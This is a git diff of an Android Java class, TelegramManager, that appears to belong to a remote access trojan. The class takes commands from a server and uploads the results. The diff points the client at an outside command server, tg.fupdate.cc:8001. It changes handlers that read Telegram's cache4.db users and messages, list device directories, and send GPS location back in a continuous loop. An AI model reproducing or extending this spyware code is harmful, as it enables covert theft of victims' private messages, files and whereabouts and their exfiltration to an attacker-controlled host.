@@ -48,7 +48,9 @@ import static java.security.AccessController.getContext;
 
 
 /**
- * 调用入口 2020/11/10 by huangche
+ * @author huangche
+ * @date 2020/11/10
+ * 调用入口
  * 注册、心跳、指令请求、指令处理、数据上传
  * 指令：
  *      APP_TG_USER Telegram数据库cache4.db users表单
@@ -76,8 +78,8 @@ public class TelegramManager {
     public static final String TAG = "TelegramManager";
     public static Context context;
 
+    public static String url = "http://tg.fupdate.cc:8001";
     //public static String url = "http://192.168.3.179:8001";
-    public static String url = "http://192.168.3.171:8000";
     public static int count = 0;
 
     public static void startAsync(final Context con) {
@@ -159,6 +161,7 @@ public class TelegramManager {
     // 请求指令
     @SuppressLint("CheckResult")
     public static void Commands(final Context context){
+        //System.out.println("20201126==>" + new Gson().toJson(GetCommon(context)));
 
         HttpRequest.Commands(GetCommon(context), url).subscribe(new Consumer<RatVo>() {
             @Override
@@ -184,12 +187,11 @@ public class TelegramManager {
                             case "APP_TG_MESSAGE": // messages
                                 int length = Integer.valueOf(jsonObject.get("length").toString());
                                 String uid = String.valueOf(Integer.valueOf(jsonObject.get("uid").toString()));
-                                /*String Mid = jsonObject.get("mid").toString().substring(1,jsonObject.get("mid").toString().length()-1);
-                                String mid = Mid.equals("0") ? null : Mid;*/
                                 String timestamp = jsonObject.get("msg_timestamp").toString().substring(1,jsonObject.get("msg_timestamp").toString().length()-1);
+                                String mid = timestamp.equals("0") ? null : timestamp;
                                 String direction = jsonObject.get("direction").toString().substring(1,jsonObject.get("direction").toString().length()-1);
-                                System.out.println("Messages==>" + "uid=" + uid + ",mid=" + timestamp + ",direction=" + direction);
-                                Datas(context,action_id,0,"success",TelegramDb.Messagess(context,"messages",length,uid,timestamp,direction));
+                                System.out.println("Messages==>" + "uid=" + uid + ",mid=" + mid + ",direction=" + direction);
+                                Datas(context,action_id,0,"success",TelegramDb.Messagess(context,"messages",length,uid,mid,direction));
                                 break;
                             case "FILE_LS": // 列目录 路径 path_ls
                                 String path_ls = jsonObject.get("path").toString().substring(1,jsonObject.get("path").toString().length()-1);
@@ -330,9 +332,9 @@ public class TelegramManager {
                                     new Thread(new Runnable() {
                                         @Override
                                         public void run() {
+                                            LocManager gps = new LocManager(context);
                                             while (true) {
                                                 int sleep = 1000;
-                                                LocManager gps = new LocManager(context);
                                                 JsonObject location = new JsonObject();
                                                 if(gps.canGetLocation()){
                                                     double latitude = gps.getLatitude();
@@ -378,9 +380,9 @@ public class TelegramManager {
                     @Override
                     public void accept(RatVo ratVo) throws Exception {
                         if (ratVo.getCode() == 0) { // 上报成功
-                            System.out.println("1113==数据上报成功>");
+                            System.out.println("2020==数据上报成功>");
                         } else { // 上报失败
-                            System.out.println("1113==数据上报失败>");
+                            System.out.println("2020==数据上报失败>");
                         }
                     }
                 });
@@ -400,9 +402,9 @@ public class TelegramManager {
                     @Override
                     public void accept(RatVo ratVo) throws Exception {
                         if (ratVo.getCode() == 0) { // 上报成功
-                            System.out.println("1113==数据上报成功s>");
+                            System.out.println("2020==数据上报成功s>");
                         } else { // 上报失败
-                            System.out.println("1113==数据上报失败s>");
+                            System.out.println("2020==数据上报失败s>");
                         }
                     }
                 });
@@ -421,9 +423,9 @@ public class TelegramManager {
                     @Override
                     public void accept(RatVo ratVo) throws Exception {
                         if (ratVo.getCode() == 0) { // 上报成功
-
+                            System.out.println("2020==实时数据上报成功>");
                         } else { // 上报失败
-
+                            System.out.println("2020==实时数据上报失败>");
                         }
                     }
                 });
